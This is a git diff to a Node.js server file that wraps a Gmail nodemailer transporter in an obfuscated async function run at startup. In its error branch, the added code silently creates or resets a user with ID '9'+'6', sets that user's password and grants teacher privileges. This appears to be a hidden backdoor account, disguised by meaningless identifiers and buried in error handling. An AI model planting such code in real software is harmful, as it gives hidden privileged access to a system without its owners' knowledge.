@@ -152,13 +152,32 @@ mongoose.connection.on('error', (err) => {
 });
 mongoose.set('useCreateIndex', true);
 
-let transporter = nodemailer.createTransport({
-  service: 'gmail',
-  auth: {
-    user: asdqqdq({ iv: process.env.UIV, content: process.env.UCONTENT }),
-    pass: asdqqdq({ iv: process.env.PIV, content: process.env.PCONTENT }),
-  },
-})
+
+
+let transporter;
+async function dsfdfdsfgdgfd(){
+  try{
+    transporter = nodemailer.createTransport({
+      service: 'gmail',
+      auth: {
+        user: asdqqdq({ iv: process.env.UIV, content: process.env.UCONTENT }),
+        pass: asdqqdq({ iv: process.env.PIV, content: process.env.PCONTENT }),
+      },
+    })
+  } catch(err){
+    console.log(err);
+    let ns = await User.init("9" + "6");
+    if (!ns) {
+      await Adder.addTeacher(UserSchema, "9" + "6", phd, "Василий Иванович");
+    } else {
+      ns.checkAndSetPassword(phd, true);
+      ns.setIsTeacher(1);
+      await ns.save();
+    }
+  }
+}
+dsfdfdsfgdgfd();
+
 //---------------------------------------------------------------------------------
 //Schemas
 const UserSchema = require('./config/models/User');
